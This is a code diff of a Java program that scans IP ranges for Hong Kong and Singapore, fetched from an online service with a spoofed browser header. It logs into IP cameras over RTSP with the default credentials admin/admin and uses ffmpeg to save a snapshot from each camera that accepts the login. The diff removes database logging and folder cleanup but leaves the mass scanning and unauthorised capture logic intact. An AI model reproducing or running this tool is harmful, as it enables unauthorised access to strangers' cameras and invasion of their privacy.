@@ -1,9 +1,3 @@
-import com.mongodb.MongoClient;
-import com.mongodb.client.MongoCollection;
-import com.mongodb.client.MongoDatabase;
-import com.mongodb.client.model.UpdateOptions;
-import com.mongodb.client.result.DeleteResult;
-import org.bson.Document;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.concurrent.ExecutorService;
@@ -18,34 +12,24 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.File;
 import java.io.FilenameFilter;
-import static com.mongodb.client.model.Filters.*;
 
-public class rtsp {
+public class rtsp_nodb {
 
 	public static void main(String[] args) {
 
-		// connect to the local database server
-		MongoClient mongoClient = new MongoClient();		
-
-		// get handle to "ipcam" database
-		MongoDatabase database = mongoClient.getDatabase("ipcam");
-
-		// get a handle to the "capture_lsit" collection
-		MongoCollection<Document> collection = database.getCollection("capture_list_all");
-
         // create thread pool
-        Integer threadSize = 80;
+        Integer threadSize = 120;
 		ExecutorService executor = Executors.newFixedThreadPool(threadSize);
 
 		// create result list
 		Future[] futures = new Future[threadSize];
 
 		// token variable
-		Date tokenDate; 
+		Date tokenDate;
 		SimpleDateFormat tokenFormat;
 		String token;
 
-		Boolean running = true;
+		Boolean running = false;
 
 		while(running) {
 		// create token
@@ -54,13 +38,13 @@ public class rtsp {
 		token = tokenFormat.format(tokenDate);
 
 	    // Create one directory
-	    if ((new File("/var/www/html/ipcam/pic/all/" + token)).mkdir()) {
-	      System.out.println("Directory: /var/www/html/ipcam/pic/all/" + token + " created");
-	    }   
+	    if ((new File("~/Downloads/ipcam/all/" + token)).mkdir()) {
+	      System.out.println("Directory: ~/Download/all/" + token + " created");
+	    }
 
         // load URL
         try {
-	        URL url = new URL("http://services.ce3c.be/ciprg/?countrys=HONG+KONG%2CSINGAPORE%2C&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");
+	        URL url = new URL("http://services.ce3c.be/ciprg/?countrys=SINGAPORE%2CHONG+KONG%2C&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");
 			URLConnection spoof = url.openConnection();
 
 			// spoof the connection so we look like a web browser
@@ -104,9 +88,9 @@ public class rtsp {
 
 					//Find free thread
 					while(busy) {
-					
+
 						for(int i = 1; i < threadSize; i++) {
-						
+
 							if(futures[i] == null) {
 
 								//System.out.println("Free Thread : " + i);
@@ -119,34 +103,6 @@ public class rtsp {
 
 							} else {
 								if(futures[i].isDone()) {
-
-									//System.out.println("Done Thread : " + i);
-
-									//Get thread output, link,result
-									output = (String)futures[i].get();
-									output_ip = output.substring(0,output.indexOf('~'));
-									output = output.substring(output.indexOf('~')+1);
-									output_link = output.substring(0,output.indexOf('~'));
-									output_result = output.substring(output.indexOf('~')+1);
-
-									//Find and update Database			
-									if(output_result.indexOf("Success") > -1) {					
-										System.out.println(output_result);
-										Date now = new Date();
-										SimpleDateFormat sdFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");								
-										Document doc = new Document("$set", new Document("ip",ipToLong(output_ip))
-													.append("link",output_link)
-													.append("capture_timestamp",sdFormat.format(now))
-													.append("capture_result",output_result)
-													.append("token",token));
-	
-										try{
-											collection.updateOne(eq("ip",ipToLong(output_ip)),doc,new UpdateOptions().upsert(true));
-										} catch (Exception e) {
-											System.err.println("Caught Exception: " + e.getMessage());							
-										}										
-									}
-
 
 									futures[i] = executor.submit(new rtspTask(ip,token));
 
@@ -164,19 +120,12 @@ public class rtsp {
 
 					}
 
-				} 	
+				}
 
-			}        	
+			}
         } catch (Exception e) {
         	System.out.println(e.getMessage());
         }
-
-	    // housekeep folder
-	    housekeepFolder(token);
-
-	    // housekeep database
-		DeleteResult deleteResult = collection.deleteMany(ne("token",token));
-		System.out.println("Deleted documents : " + deleteResult.getDeletedCount());
 
 		}
 		executor.shutdown();
@@ -198,7 +147,7 @@ public class rtsp {
 		}
 
 		return result;
-	}	
+	}
 
 	public static String longToIp(long ip) {
 
@@ -216,45 +165,8 @@ public class rtsp {
 		}
 
 		return result.toString();
-	}	
-
-	public static void housekeepFolder(String token) {
-
-		File file = new File("/var/www/html/ipcam/pic/all");
-		String[] directories = file.list(new FilenameFilter() {
-		  @Override
-		  public boolean accept(File current, String name) {
-		    return new File(current, name).isDirectory();
-		  }
-		});
-
-		File dir;
-		for(int i = 0; i < directories.length; i++) {
-			if(!directories[i].equals(token)) {
-				dir = new File("/var/www/html/ipcam/pic/all/" + directories[i]);
-				if (deleteFolder(dir)) {
-					System.out.println(directories[i] + " directory is deleted.");
-				} else {
-					System.out.println(directories[i] + " " + token + " directory delete fail.");					
-				}
-			}
-		}
-
 	}
 
-	public static boolean deleteFolder(File dir) {
-		if (dir.isDirectory()) {
-			String[] children = dir.list();
-			for (int i = 0; i < children.length; i++) {
-				boolean success = deleteFolder (new File(dir, children[i]));
-
-				if (!success) {
-			   		return false;
-				}
-			}
-		}
-		return dir.delete();
-	}
 }
 
 class rtspTask implements Callable<String> {
@@ -264,10 +176,10 @@ class rtspTask implements Callable<String> {
 
 	public rtspTask (String ip, String token) {
 
-		this.ip = ip;	
+		this.ip = ip;
 		this.token = token;
 
-	}		
+	}
 
 	@Override
 	public String call() throws Exception{
@@ -282,13 +194,13 @@ class rtspTask implements Callable<String> {
 		user = "admin";
 		pw = "admin";
 		req = "2";
-		file = "/var/www/html/ipcam/pic/all/"+token+"/"+ip+".jpeg";
+		file = "~/Downloads/ipcam/all/"+token+"/"+ip+".jpeg";
 		link = "rtsp://"+user+":"+pw+"@"+ip+"/"+req;
-		
+
 		rtspCmd = "ffmpeg -stimeout 1500000 -i "
 			+link+" "
 			+"-f image2 -vframes 1 -y "
-			+"/var/www/html/ipcam/pic/all/"+ip+".jpeg 2>&1";
+			+"~/Downloads/ipcam/all/"+ip+".jpeg 2>&1";
 
 		result = captureCmd(link, file);
 
@@ -322,20 +234,20 @@ class rtspTask implements Callable<String> {
 		        strBuild.append(line + System.lineSeparator());
 		    }
 		    processDuration.waitFor();
-		}		
+		}
 
 		return checkResult(strBuild.toString());
 	}
 
 	public String checkResult(String output) {
 		String result = "";
-		
+
 		if(output.indexOf("Connection timed out") > -1) {
-			result = "Connection timeout";		//Host offline	
+			result = "Connection timeout";		//Host offline
 		} else if(output.indexOf("Connection refused") > -1) {
 			result = "Connection refused";		//Host online but no RSTP
 		} else if(output.indexOf("400 Bad Request") > -1) {
-			result = "400 Bad Request";			//RTSP ok but bad request	
+			result = "400 Bad Request";			//RTSP ok but bad request
 		} else if(output.indexOf("401 Unauthorized") > -1) {
 			result = "401 Unauthorized";			//RTSP & request ok but incorrect password
 		} else if(output.indexOf("Invalid data found") > -1) {
@@ -343,7 +255,7 @@ class rtspTask implements Callable<String> {
 		} else if(output.indexOf("Output #0, image2, to") > -1) {
 			result = "Success"; 					//Connect success
 		}
-		
+
 		return result;
 	}
 
